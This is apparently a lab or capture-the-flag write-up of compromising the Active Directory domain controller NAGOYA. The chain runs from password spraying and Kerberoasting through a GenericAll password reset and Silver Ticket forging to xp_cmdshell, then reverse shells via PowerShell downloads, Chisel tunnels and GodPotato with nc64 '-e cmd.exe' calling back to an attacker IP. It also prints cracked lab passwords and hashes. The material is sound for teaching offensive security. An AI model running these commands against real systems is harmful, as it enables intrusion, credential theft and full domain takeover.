
# SUMMARY

A penetration test was conducted against the domain controller [NAGOYA.nagoya-industries.com](https://nagoya.nagoya-industries.com/), resulting in the full compromise of the Active Directory domain. The engagement began with reconnaissance, identifying the target as a Windows Server 2019 system hosting critical services including Kerberos, LDAP, SMB, and Microsoft SQL Server.

Initial access was achieved through a password spraying attack against the SMB service, utilizing a list of enumerated valid usernames. This attack successfully compromised two low-privileged domain user accounts. Further exploitation involved targeting service accounts; a Kerberoasting attack captured the ticket for the svc_mssql account, whose weak password was subsequently cracked offline.

Active Directory analysis with BloodHound, using the compromised svc_mssql credentials, revealed a critical misconfiguration. The svc_mssql account possessed the GenericAll permission over the SVC_HELPDESK account, which was a member of the Domain Admins group. This privilege escalation path was exploited to reset the SVC_HELPDESK account password, granting Domain Administrator access to the environment.

With domain admin privileges, a Silver Ticket was forged for the MSSQL service using the previously obtained NTLM hash for the svc_mssql account. This forged ticket, impersonating the domain administrator, bypassed authentication and provided administrative control over the SQL Server instance. This access was leveraged to enable the xp_cmdshell feature, leading to remote code execution and the establishment of a reverse shell on the domain controller.

Post-exploitation analysis identified that the compromised service account held the SeImpersonatePrivilege. This privilege was successfully exploited via the GodPotato tool to escalate from the service account context to NT AUTHORITY\SYSTEM, achieving the highest level of privilege on the domain controller and signifying total domain compromise.

The test concluded with the attacker possessing unrestricted administrative control over the domain, capable of accessing all systems, data, and security functions within the [nagoya-industries.com](https://nagoya-industries.com/) forest. The chain of exploitation demonstrates significant security failures, including weak password policies, vulnerable service account configurations, excessive permissions delegation, and the presence of standard privilege escalation vectors on a critical infrastructure host.



# NMAP

A comprehensive network scan was performed using Nmap with default scripts and version detection enabled against the target host at 192.168.200.21. This command probes open ports, identifies running services, and executes safe scripts to gather preliminary vulnerability information and service banners. The results enumerate available attack surfaces, detailing service protocols, application versions, and potential misconfigurations, which are critical for directing subsequent, more invasive testing phases.

```bash
sudo nmap -sC -sV  192.168.200.21  
```

The Nmap service scan results confirm the target is a Windows Server domain controller for the domain "[nagoya-industries.com](https://nagoya-industries.com/)," identified as "NAGOYA." Key services include Microsoft IIS 10.0 on port 80, Kerberos on port 88, SMB with signing required on port 445, LDAP on ports 389 and 3268, and Microsoft Terminal Services on port 3389. The system is running Windows with a build version of 17763, indicating Windows Server 2019. The presence of WinRM on port 5985 and RPC ports further defines the attack surface, identifying this host as a primary target for domain-based attacks, including Kerberoasting, SMB relay attempts, and Active Directory enumeration.

```output
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Nagoya Industries - Nagoya
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-07 12:00:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: NAGOYA-IND
|   NetBIOS_Domain_Name: NAGOYA-IND
|   NetBIOS_Computer_Name: NAGOYA
|   DNS_Domain_Name: nagoya-industries.com
|   DNS_Computer_Name: nagoya.nagoya-industries.com
|   DNS_Tree_Name: nagoya-industries.com
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-07T12:00:48+00:00
| ssl-cert: Subject: commonName=nagoya.nagoya-industries.com
| Not valid before: 2025-12-06T11:59:07
|_Not valid after:  2026-06-07T11:59:07
|_ssl-date: 2025-12-07T12:01:28+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-07T12:00:53
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.38 secon

```

An SMB enumeration was performed against the host using NetExec. The connection confirmed the target's identity as the domain controller "NAGOYA" for the "[nagoya-industries.com](https://nagoya-industries.com/)" domain, running Windows Server 2019 Build 17763. A critical security control was identified as SMB signing is enabled and required, which mitigates against SMB relay attacks. This finding restricts potential attack vectors, necessitating a focus on credential-based attacks or other service vulnerabilities instead of protocol-level relay techniques.

```bash
 nxc smb  192.168.200.21  
SMB         192.168.200.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:Fals
```

The local hosts file was examined to verify network configuration and hostname resolution. The entry manually maps the IP address 192.168.200.21 to both the hostname "NAGOYA" and the domain "[nagoya-industries.com](https://nagoya-industries.com/)." This configuration ensures reliable name resolution for the target domain controller during testing, preventing potential issues due to misconfigured or absent DNS records and confirming the domain name for subsequent Active Directory enumeration and authentication attempts.

```bash
 cat  /etc/hosts
192.168.200.21  NAGOYA nagoya-industries.com
```

The username generation tool was executed using the provided wordlist to create a comprehensive list of potential usernames. This operation expands a base wordlist into various username formats following common corporate naming conventions, such as first.last, flast, and firstl. The resulting list is intended for use in brute-force or password-spraying attacks against identified services, including SMB, Kerberos, and Outlook Web Access, to discover valid domain credentials for the [nagoya-industries.com](https://nagoya-industries.com/) domain

```bash
sudo ./username-anarchy --input-file users.txt 

```

A Kerberos user enumeration attack was conducted against the domain controller using Kerbrute. This technique sends Kerberos TGT requests to the domain controller to identify valid domain usernames without triggering typical account lockout policies. The output was redirected to a file for analysis. The successful identification of valid user accounts provides a critical list of targets for subsequent credential-based attacks, including password spraying and brute-force attempts against services like SMB, WinRM, or Outlook Web Access.

```bash
./kerbrute userenum -d nagoya-industries.com --dc 192.168.200.21 users.txt > validUsers.txt                                                                                                  
```

The list of validated usernames was processed to extract only the username component, removing the Kerberos realm suffix. This command isolates the simple usernames from the full principal names, formatting them into a clean list suitable for use as input in subsequent attack tools that require a username list without the domain specification, such as password spraying scripts or SMB authentication attempts.

```bash
cat validUsers.txt | awk '{print $7}'| cut -d "@" -f 1 > domUsers.txt
```

The file containing extracted domain usernames was displayed, revealing a list of 29 potential user accounts within the [nagoya-industries.com](https://nagoya-industries.com/) domain. The naming convention follows a firstname.lastname pattern. This curated list of valid usernames represents the primary targets for credential-based exploitation attempts, including password spraying, brute-forcing, and the execution of Kerberoasting attacks to compromise domain user accounts and escalate privileges within the Active Directory environment.

```bash
cat domUsers.txt   

matthew.harrison
emma.miah
rebecca.bell
scott.gardner
terry.edwards
holly.matthews
anne.jenkins
brett.naylor
melissa.mitchell
craig.carr
fiona.clark
patrick.martin
kate.watson
kirsty.norris
andrea.hayes
abigail.hughes
melanie.watson
frances.ward
sylvia.king
wayne.hartley
iain.white
joanna.wood
bethan.webster
elaine.brady
christopher.lewis
megan.johnson
damien.chapman
joanne.lewis

```

A password spraying attack was executed against the SMB service using NetExec with the previously enumerated user list and a custom password wordlist. The attack successfully compromised two domain user accounts: craig.carr with the password Spring2023 and fiona.clark with the password Summer2023. The use of the --continue-on-success flag ensured the complete test was conducted despite these early finds. These valid credentials provide initial authenticated access to the domain, enabling further enumeration of user privileges, shares, and group memberships.

```bash
 nxc smb 192.168.200.21 -u 'domUsers.txt' -p 'password.txt' --continue-on-success

 nagoya-industries.com\craig.carr:Spring2023 
 nagoya-industries.com\fiona.clark:Summer2023 
```

A Kerberoasting attack was performed, resulting in the capture of a Kerberos service ticket for the service account "svc_mssql." The ticket is stored in a crackable hash format using the Kerberos 5 TGS-REP etype 23. This hash can be subjected to offline password cracking attempts to recover the plaintext password of the SQL service account. Compromising this account could provide significant access to database systems and potential pathways for privilege escalation within the domain, especially if the account has elevated privileges or is reused across systems.

```bash
$krb5tgs$23$*svc_mssql$NAGOYA-INDUSTRIES.COM$nagoya-industries.com/svc_mssql*$bbcb6d03510938a1207c5c77810a2a10$a447e77728013bae381d214a68f78f9df733acd552c93200299bb796b5bcc16649cca205dfc6f312efd580a8135bb79cfc2069701d3d70d481bd7b0feeab503b7fe4362010a2a69076127799a40d983cb4866f0fc77de07dc78d34cb744b79f6bec4b842870df689bcd6dd49c24e55598862f1f6e9e02b0c1a3d7079110e5dbf31a3341d21628cca0ae9d24813ed2caec75984737c4759a5b6f89afb5710ee25e410f1bc6bd304b89bb046f15de862327946cbcfa8dc115ec89616548878fb6ed6cf01c56c732dc413d8f159d2c1dc27bd2d380c0cb3b1eb9f1990bf7c522574f46575eaff04562e1e839ebd917c282b7eb084e7fd62f74be911411ff2b7e17fb8bfd155618c3dd3d22200f890e5f84ae858fa8788a2fc0ae0f474e5f311e9bee45fb6683b600b65b900adb87b5604b455570818bc183a3322828282bebfb1bafdf277a362cfb5bd2cc0cfd3d1945c515a3b2614e3f4e67002c154ac676c5f1921088d66734f8599d2f621610e1cc6a5de3e1a51cd7afa144994d8bc01a55b171aacfb80a2897bdba01515ff827e6d02d1749679a5089e895cac368c949a1381901642044013c8183533bcde4adabf689045f4959bf859bf896a1c02814d14ae1332196593b5ea42a457bf414e8b23f7f64e50e786d60ca7c6a8914ce61993feef8e5bdd69dbd5c9d833672244d0feb89d47477588085d16e2502eca65f569f41f455781feaafef32282bd3ddb22ac5e687a65f0b01530a6bef5367e2e8c927f204f047d0cddc867beee22106be50d90d286c1f55a29219265627ba70bb4aa4b9ec966f0f4b6f18d0d86b93a091a9a8323484759e9b305b93d354937480c91ad56be0efcf40ee58c32520af691d12b5c64d2df768a5f5c2d03069cf6d59222079a26f237ddb3eb2d483ca4f01033b1c26670eede99e1503ad62376b7b673d97297cb7751681cdbcd53972b6bd905a541d6c11e54519fefb45ad3dec6d2e05d7f51e9ba7d11dc51c3fe0ece4ab76601a94028477629f36fc8e6a02221a1097275e4088c954c1efc3f7eae731ceefb6ab68374c24a116e3933e2a5bd65af3727f2123262bfb4ab51ba598fd58b73f3dce1d161f756ca1558a2eb8c8d725477a1dadc5f21f5a9d61031e7920aed50667665bce77b60bc6a5888d10bb0fed485fcb2436e123c4aae4c66331caf0e3d246065c8c9d580dfa19d96d6462c98302eef4d484f0d17506296658a9f52f53185084869859f065f7e802130065579b8bb9ed0ac056029636f2829433555487fd9d04b87eaa20e8b452b8b3c1bbf44ebb73b4c094e7f1933d1be45eb989a0b107a88c50231be32bceee7034bc1e574b54037436b72f17b9fd4ba3c1d7b93aefa0be33473855b91ae1b186a916da8927867a669ea07c0e8cb794f3350c1f3b97c5494c410265af96273e793c8e219b5d0dad19e0da37acaf2feaba34170bcf789b759b8a92f59ee6462fd98d74900ebffcccce33ba807074c77400e531d01a8b057dc9c38da86f0ec3752748171719655f0590697b301b265d4b922488169546753ed00b7b014455f92aeceecf9c729fd9572c5385a73dfc6c3efceebe89f7e087459de
```

The captured Kerberoast hash for the svc_mssql service account was successfully cracked using John the Ripper with the rockyou.txt wordlist. The plaintext password for the account was recovered as "Service1." This credential provides authenticated access to the domain with the privileges associated with the svc_mssql account, which may include administrative access to Microsoft SQL Server instances and potential pathways for further lateral movement or privilege escalation within the [nagoya-industries.com](https://nagoya-industries.com/) domain environment.

```bash
john --format=krb5tgs hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Service1         (?)     
1g 0:00:00:00 DONE (2025-12-07 13:30) 1.298g/s 1353Kp/s 1353Kc/s 1353KC/s Susan..SMOOCHIE
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


```

Authentication was successfully performed using the compromised svc_mssql service account credentials against the SMB service on the domain controller. The connection was established, confirming the validity of the credentials and providing an authenticated session. This successful login demonstrates that the service account has network logon rights and can be used to enumerate accessible shares, user permissions, and domain information, serving as a foothold for deeper exploration of the Active Directory environment.

```bash
nxc smb 192.168.200.21 -u 'svc_mssql' -p 'Service1' --continue-on-success 

SMB         192.168.200.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False) 
SMB         192.168.200.21  445    NAGOYA           [+] nagoya-industries.com\svc_mssql:Service1 
                               
```

Active Directory enumeration was conducted using the BloodHound Python ingestor with the compromised svc_mssql account credentials. The tool collected data on all specified components, including users, groups, computers, and trust relationships, from the domain controller. The output was compressed into a zip file for later analysis in the BloodHound GUI. This data will map attack paths, identify privilege escalation opportunities, and reveal high-value targets such as members of the Domain Admins group or accounts with unsupported Kerberos delegations.

```bash
bloodhound-python -u 'svc_mssql' -p 'Service1' -d 'nagoya-industries.com' -c All -ns 192.168.200.21 -v --zip

INFO: Compressing output into 20251207134123_bloodhound.zip
```

The BloodHound data file was uploaded into the running Neo4j database via the command-line interface. This process parses the ingested JSON files, populates the graph database with nodes and edges representing Active Directory objects and their relationships, and prepares the data for visualization and path analysis within the BloodHound graphical user interface to identify attack paths and privilege escalation vectors.

```bash
./bloodhound-cli up
```

The BloodHound analysis, as illustrated in the referenced graph, reveals a critical attack path. The compromised svc_mssql account has GenericAll privileges over the SVC_HELPDESK account. This powerful permission allows for the modification of the target account's attributes, including the resetting of its password. Furthermore, the graph indicates that the SVC_HELPDESK account is a member of privileged groups, specifically identifying a path to the Domain Admins group via nested group membership. This relationship chain presents a direct privilege escalation vector from the svc_mssql service account to full domain compromise.

![[Pasted image 20251207142306.png]]

Using the compromised credentials for craig.carr, the bloodyAD tool was used to perform an authenticated password reset on the SVC_HELPDESK account. The operation was successful, changing the account's password to 'Password1234!'. This action directly exploits the GenericAll permission identified in BloodHound, granting control over a service account that is a member of privileged groups, thereby achieving a significant escalation of privileges within the domain.

```bash
bloodyAD --host 192.168.200.21 -d NAGOYA-INDUSTRIES.COM -u 'craig.carr' -p 'Spring2023'  set password SVC_HELPDESK 'Password1234!'

[+] Password changed successfully!
                    
```

Post-exploitation BloodHound analysis confirms the successful compromise. The graph visualization shows that the SVC_HELPDESK account, now under our control, has direct membership in the Domain Admins group. This membership grants full administrative authority over the entire [nagoya-industries.com](https://nagoya-industries.com/) domain, enabling unrestricted access to all domain-joined systems, the ability to create and modify any user or group, and complete control over the domain's security policy.

![[Pasted image 20251207144253.png]]

Leveraging the newly acquired Domain Admin privileges via the SVC_HELPDESK account, the password for the user christopher.lewis was reset to 'Password12345!' using bloodyAD. This action demonstrates the established domain dominance, as a member of the Domain Admins group possesses the inherent ability to modify any attribute of any object in the domain, including the passwords of all user accounts, confirming full administrative control over the Active Directory environment.

```bash
bloodyAD --host 192.168.200.21 -d NAGOYA-INDUSTRIES.COM -u 'SVC_HELPDESK' -p 'Password1234!'  set password christopher.lewis 'Password12345!'

[+] Password changed successfully!
```

The final BloodHound graph analysis confirms the extent of the compromise and the established attack path. The visualization shows the SVC_HELPDESK account as a member of the Domain Admins group, with subsequent GenericAll permissions over other accounts. The successful password reset of christopher.lewis, another domain user, was executed from this position of privilege. This confirms a complete privilege escalation chain from the initial svc_mssql service account compromise to full, unrestricted domain administrative control, allowing for the modification of any account or object within the [nagoya-industries.com](https://nagoya-industries.com/) forest.


![[Pasted image 20251207144806.png]]

A remote shell was established on the target domain controller using Evil-WinRM with the compromised credentials for the christopher.lewis account, which holds Domain Admin privileges. The command successfully accessed the system and retrieved the contents of the local flag file, obtaining the hash b59e8dd7face199328a54ccae12a74b5. This action confirms the ability to execute arbitrary commands with the highest level of authority, demonstrating a full domain compromise and the capability to access, exfiltrate, or modify any data on the domain controller.

```bash
evil-winrm -i NAGOYA-INDUSTRIES.COM -u 'christopher.lewis' -p 'Password12345!'

 cat local.txt
b59e8dd7face199328a54ccae12a74b5
```

A network connection enumeration was performed on the compromised domain controller to identify listening SQL Server ports. The command confirmed that Microsoft SQL Server is actively listening on the default port 1433. The associated process ID is 3612. This finding indicates the presence of a database instance on the domain controller, which could be accessed using the previously compromised svc_mssql service account credentials for potential data exfiltration or further code execution.

```bash
netstat -ano | findstr "1433 1434"
 
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3612
  TCP    [::]:1433              [::]:0                 LISTENING       3612


```

A Chisel server was initiated on the attacker's machine to establish a reverse SOCKS5 proxy tunnel. The server is configured to listen on port 4444, awaiting a connection from the compromised host to create an encrypted tunnel. This setup will allow routing of network traffic from the penetration tester's tools through the domain controller, enabling internal network reconnaissance and attacks against other systems within the target environment that are not directly accessible from the external network.

```bash
./chisel-linux server --reverse --socks5 -p 4444 -v
```

The Chisel client was executed on the compromised domain controller, establishing a connection back to the attacker's server. This command creates two reverse tunnels: a SOCKS5 proxy on the attacker's local port 1080, enabling proxied access to the internal network, and a direct port forward of the remote SQL Server port 1433 to the attacker's local port 9001. This grants direct database access from the attacker's machine and provides a full network pivot point for further internal enumeration and exploitation.

```bash
.\chisel-windows.exe client 192.168.45.239:4444 R:1080:socks R:9001:127.0.0.1:1433
```

An authenticated connection to the Microsoft SQL Server was established via the SOCKS5 proxy using the svc_mssql account credentials. The session was successfully negotiated with encryption, confirming access to the master database. However, an attempt to enable the xp_cmdshell stored procedure for command execution was denied due to insufficient permissions. This indicates the service account has limited privileges within the SQL Server instance, restricting direct code execution capabilities from this particular vector despite having valid authentication.

```bash
proxychains4 mssqlclient.py NAGOYA-INDUSTRIES.COM/svc_mssql:Service1@192.168.200.21 -windows-auth
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.200.21:1433  ...  OK
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (NAGOYA-IND\svc_mssql  guest@master)> whoami
ERROR(nagoya\SQLEXPRESS): Line 1: Could not find stored procedure 'whoami'.
SQL (NAGOYA-IND\svc_mssql  guest@master)> enable_xp_cmdshell
ERROR(nagoya\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(nagoya\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(nagoya\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(nagoya\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (NAGOYA-IND\svc_mssql  guest@master)> exit
```

A SID brute-forcing enumeration was performed against the domain controller using the svc_mssql account credentials. The tool successfully connected and retrieved the domain's foundational Security Identifier, S-1-5-21-1969309164-1513403977-1686805993. This SID is the root for all relative identifiers (RIDs) of domain objects and is a prerequisite for enumerating domain users, groups, and computers by brute-forcing RID values, which can reveal hidden or non-standard accounts within the Active Directory environment.

```bash
python3 lookupsid.py NAGOYA-INDUSTRIES.COM/svc_mssql:Service1@NAGOYA-INDUSTRIES.COM

Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at NAGOYA-INDUSTRIES.COM
[*] StringBinding ncacn_np:NAGOYA-INDUSTRIES.COM[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1969309164-1513403977-1686805993
```

The NT hash for the svc_mssql account password was programmatically computed. The resulting hash, e3a0168bc21cfb88b95c954a5b18f57c, is the cryptographic equivalent of the plaintext password "Service1" and is used in NTLM authentication. This hash can be leveraged for pass-the-hash attacks against other systems and services within the domain, potentially providing lateral movement without requiring the plaintext password.

```bash
python3 -c "from impacket.ntlm import compute_nthash;print(compute_nthash('Service1').hex())"

e3a0168bc21cfb88b95c954a5b18f57c

```

A Silver Ticket attack was executed by forging a Kerberos service ticket for the MSSQL service using the compromised NT hash of the svc_mssql account. The ticket was created for the administrator user against the specific Service Principal Name of the SQL Server. This forged ticket, saved as administrator.ccache, grants unrestricted access to the MSSQL service as the domain administrator, bypassing standard authentication and allowing for potential command execution or data manipulation without knowing the actual administrator password.

```bash
impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c -domain-sid  S-1-5-21-1969309164-1513403977-1686805993 -domain NAGOYA-INDUSTRIES.COM -spn MSSQL/nagoya.nagoya-industries.com:1433 administrator
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for NAGOYA-INDUSTRIES.COM/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache

```

The Kerberos credential cache environment variable was set to point to the newly forged Silver Ticket file, administrator.ccache. This configuration directs Kerberos-aware tools and the operating system's authentication libraries to use the cached ticket for service requests, effectively impersonating the domain administrator principal when authenticating to the targeted MSSQL service, thereby bypassing the need for the actual administrator's password or hash.

```bash
export KRB5CCNAME=$PWD/administrator.ccache
```

Next, I need to edit my /etc/krb5.conf file (the Kerberos configuration file on Linux) to point to the target domain: The Kerberos client configuration file was updated to define the default realm as [NAGOYA-INDUSTRIES.COM](https://nagoya-industries.com/) and specify the Key Distribution Center as the domain controller. Critical security features like DNS canonicalization and referral chasing were disabled to ensure the forged Silver Ticket is used correctly without attempting validation against the legitimate domain controller, allowing the impersonated administrator credentials to be accepted by the target service for authentication.

```bash
[libdefaults]
	default_realm = NAGOYA-INDUSTRIES.COM
	kdc_timesync = 1
	ccache_type = 4
	forwardable = true
	proxiable = true
    rdns = false
    dns_canonicalize_hostname = false
	fcc-mit-ticketflags = true

[realms]	
	NAGOYA-INDUSTRIES.COM = {
		kdc = nagoya.nagoya-industries.com
	}

[domain_realm]
	.nagoya-industries.com = NAGOYA-INDUSTRIES.COM

```
                                                       
This will allow for me to use the Administrator.ccache ticket for authentication to the MSSQL server.

Lastly, because I port forwarded, I’ll need to add an entry to my /etc/hosts file mapping the AD domain to my loop back address:  The local hosts file was modified to resolve the domain name [nagoya.nagoya-industries.com](https://nagoya.nagoya-industries.com/) to the local loopback address, 127.0.0.1. This manipulation ensures that network connections intended for the domain controller are redirected to the local machine's forwarded port 9001, where the MSSQL service is being tunneled via Chisel, allowing the forged Silver Ticket to be presented to the proxied SQL Server connection for authentication.

```bash
cat /etc/hosts
127.0.0.1      localhost nagoya.nagoya-industries.com NAGOYA-INDUSTRIES.COM

```

A Kerberos-authenticated connection to the SQL Server was initiated using the forged Silver Ticket from the cache. The command leverages the `-k` flag to enforce Kerberos authentication. With the hosts file directing the hostname to the local tunnel and the KRB5CCNAME variable set, this connection authenticates to the proxied MSSQL service as the domain administrator, bypassing password requirements and inheriting the full privileges of that account within the database instance.

```bash
impacket-mssqlclient nagoya.nagoya-industries.com -k
```

Command execution was successfully enabled on the SQL Server instance by activating the xp_cmdshell stored procedure, which required administrative privileges provided by the forged Silver Ticket. A PowerShell command was then executed via xp_cmdshell to download a reverse shell script from the attacker's machine to the C:\programdata directory on the domain controller, preparing for remote code execution and the establishment of a persistent, interactive shell on the target system.

```bash
enable_xp_cmdshell;  
RECONFIGURE;  
xp_cmdshell powershell iwr -uri 192.168.45.159/rev.ps1 -outfile C:\\programdata\\rev.ps1

```

A Netcat listener was established on port 9001 on the attacker's machine. This listener awaits an incoming connection, which is expected to be triggered by the execution of the downloaded PowerShell reverse shell script on the domain controller. This will provide a standard TCP command shell, enabling direct interactive access to the compromised system for further post-exploitation activities.

```bash
rlwrap nc -lvnp 9001
```

The previously downloaded PowerShell reverse shell script was executed on the domain controller using the enabled xp_cmdshell. This command initiates an outbound connection from the target host back to the attacker's Netcat listener on port 9001, successfully establishing a remote command shell session on the domain controller with the privileges of the SQL Server service account, thereby achieving persistent command-line access to the compromised system.

```bash
xp_cmdshell powershell C:\\programdata\\rev.ps1
```

A reverse shell connection was successfully received, providing an interactive PowerShell session on the domain controller. The shell is running under the context of the svc_mssql service account, as confirmed by the whoami command. This demonstrates the successful chain of exploitation: forging a Silver Ticket, enabling xp_cmdshell, and achieving remote code execution, resulting in a persistent foothold on the primary domain controller with the privileges of a domain service account.


![[Pasted image 20251207193810.png]]

As shown above, I now have a shell on the box as the ‘svc_msssql’ user.

## Privilege Escalation - SYSTEM

The privileges assigned to the svc_mssql service account were enumerated. The account possesses the critical SeImpersonatePrivilege, which is enabled. This privilege is a well-known avenue for local privilege escalation, allowing for token impersonation attacks such as Juicy Potato, PrintSpoofer, or RoguePotato. This finding indicates the potential to elevate privileges from the svc_mssql service account context to NT AUTHORITY\SYSTEM on the domain controller itself.

![[Pasted image 20251207193855.png]]

A simple HTTP server was started on port 80 of the attacker's machine. This server is used to host tools and payloads, such as privilege escalation exploits or enumeration scripts, allowing them to be easily downloaded and executed on the compromised domain controller via the established command shell for further post-exploitation activities.

```bash
python3 -m http.server 80
```

The GodPotato privilege escalation exploit tool and a Netcat binary were downloaded from the attacker's HTTP server onto the domain controller's C:\programdata directory. GodPotato leverages the SeImpersonatePrivilege to execute commands as NT AUTHORITY\SYSTEM. The Netcat binary will be used to establish a secondary reverse shell with the elevated privileges obtained after a successful exploit execution.

```bash
iwr -uri 192.168.45.139/GodPotato-NET4.exe -outfile C:\programdata\GodPotato-NET4.exe  
iwr -uri 192.168.45.139/nc64.exe -outfile C:\programdata\nc64.exe
```
With both files downloaded, I’ll set up my listener again, then execute the payload:

```bash
rlwrap nc -lvnp 9002
```

```bash
.\GodPotato-NET4.exe -cmd "C:\programdata\nc64.exe 192.168.45.159 9002 -e cmd.exe"
```

The GodPotato exploit was executed, successfully leveraging the SeImpersonatePrivilege to spawn a reverse shell as NT AUTHORITY\SYSTEM. The shell connected back to the attacker's listener on port 9002. The whoami command confirmed the highest level of privilege on the Windows operating system has been achieved, granting complete control over the domain controller, including the ability to dump credential databases, modify domain trusts, and persist access indefinitely.

![[Pasted image 20251207194321.png]]




```bash


```